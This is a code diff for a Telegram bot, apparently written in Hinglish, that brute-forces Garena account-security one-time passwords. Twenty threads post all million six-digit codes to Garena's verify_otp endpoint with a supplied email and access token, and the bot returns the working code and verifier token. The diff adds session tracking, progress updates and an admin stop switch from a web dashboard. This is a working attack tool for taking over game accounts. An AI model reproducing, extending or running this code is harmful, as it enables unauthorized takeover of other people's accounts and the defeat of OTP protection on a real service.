@@ -489,15 +489,29 @@ async def proceed_to_feature(update: Update, context: ContextTypes.DEFAULT_TYPE)
         except Exception as e:
             await _err(update, context, f"Error: `{e}`")
             return ConversationHandler.END
+
+        user = update.effective_user
+        log_id = context.user_data.get("_log_id")
+        session_id = db.start_bf_session(
+            log_id=log_id,
+            user_id=user.id if user else chat_id,
+            username=getattr(user, "username", None),
+            email=email,
+            access_token=access,
+        )
+        stop_event = threading.Event()
+        db.register_bf_stop_signal(session_id, stop_event)
+
         await msg.reply_text(
             "✅ OTP bhej diya!\n\n"
             "🔨 *Brute Force background mein shuru ho gaya!*\n"
+            f"🆔 *Session ID:* `#{session_id}`\n"
             "Jab sahi code mile sirf tab ek message aayega. ⏳",
             parse_mode="Markdown", reply_markup=back_kb()
         )
         context.application.create_task(
             run_brute_force(chat_id, email, access, context.application.bot,
-                            context.user_data.get("_log_id"))
+                            log_id, session_id=session_id, stop_event=stop_event)
         )
         return ConversationHandler.END
 
@@ -872,30 +886,41 @@ async def change_get_new_otp(update: Update, context: ContextTypes.DEFAULT_TYPE)
 # ─── Brute Force (Background) ─────────────────────────────────────────────────
 
 async def run_brute_force(
-    chat_id: int, email: str, access: str, bot, log_id: int | None
+    chat_id: int, email: str, access: str, bot, log_id: int | None,
+    session_id: int | None = None, stop_event: threading.Event | None = None,
 ) -> None:
-    found_event   = threading.Event()
+    if stop_event is None:
+        stop_event = threading.Event()
+
     result_holder: list[dict] = []
+    attempt_counter = [0]
+    counter_lock = threading.Lock()
 
     def try_codes(start: int, end: int) -> None:
         url = "https://100067.connect.garena.com/game/account_security/bind:verify_otp"
         for code in range(start, end):
-            if found_event.is_set():
+            if stop_event.is_set():
                 return
             code_str = f"{code:06d}"
             try:
-                resp   = requests.post(url, headers=GARENA_HEADERS,
-                                       data={"email": email, "app_id": GARENA_APP_ID,
-                                             "access_token": access, "otp": code_str},
-                                       timeout=15)
+                resp = requests.post(url, headers=GARENA_HEADERS,
+                                     data={"email": email, "app_id": GARENA_APP_ID,
+                                           "access_token": access, "otp": code_str},
+                                     timeout=15)
+                with counter_lock:
+                    attempt_counter[0] += 1
+                    current = attempt_counter[0]
+                if current % 300 == 0 and session_id:
+                    db.update_bf_progress(session_id, current)
+
                 result = resp.json()
                 if result.get("result") == 0:
-                    found_event.set()
+                    stop_event.set()
                     result_holder.append({"code": code_str,
                                           "verifier_token": result.get("verifier_token", "")})
                     return
             except Exception:
-                if found_event.is_set():
+                if stop_event.is_set():
                     return
 
     NUM_THREADS, TOTAL = 20, 1_000_000
@@ -916,20 +941,34 @@ async def run_brute_force(
     if result_holder:
         r = result_holder[0]
         if log_id:
-            db.update_result(log_id, "success")
+            db.update_result(log_id, "success", details=f"Code found: {r['code']}")
+        if session_id:
+            db.end_bf_session(session_id, "success", found_code=r["code"])
         await bot.send_message(
             chat_id=chat_id,
             text=(
-                "🎯 *Brute Force — CODE MIL GAYA!*\n"
+                "🎯 <b>Brute Force — CODE MIL GAYA!</b>\n"
                 "━━━━━━━━━━━━━━━━━━━━━━\n"
-                f"🔑 OTP Code: `{r['code']}`\n"
-                f"🎫 Verifier Token: `{r['verifier_token']}`"
+                f"🔑 OTP Code: <code>{r['code']}</code>\n"
+                f"🎫 Verifier Token: <code>{r['verifier_token']}</code>"
             ),
-            parse_mode="Markdown", reply_markup=back_kb()
+            parse_mode="HTML", reply_markup=back_kb()
+        )
+    elif stop_event.is_set():
+        if log_id:
+            db.update_result(log_id, "stopped", details="Stopped via Web Dashboard")
+        if session_id:
+            db.end_bf_session(session_id, "stopped_by_admin")
+        await bot.send_message(
+            chat_id=chat_id,
+            text="🛑 <b>Brute Force ko admin ne Web Dashboard se rok diya hai.</b>",
+            parse_mode="HTML", reply_markup=back_kb()
         )
     else:
         if log_id:
-            db.update_result(log_id, "failed")
+            db.update_result(log_id, "failed", details="Full space checked, code not found")
+        if session_id:
+            db.end_bf_session(session_id, "failed")
         await bot.send_message(
             chat_id=chat_id,
             text="❌ Brute force complete — sahi code nahi mila.\n(000000–999999 sab try ho gaye)",
@@ -992,10 +1031,7 @@ async def run_webhook_server(app: Application, base_url: str, webhook_secret: st
             return web.Response(text="OK")
 
     server_app.router.add_post(f"/{clean_secret}", telegram_webhook)
-    server_app.router.add_get("/", monitoring._root)
-    server_app.router.add_get("/monitor", monitoring._dashboard)
-    server_app.router.add_get("/api/data", monitoring._api_data)
-    server_app.router.add_post("/api/flag/{id}", monitoring._api_flag)
+    server_app.add_routes(monitoring.get_webhook_routes())
 
     runner = None
     site = None
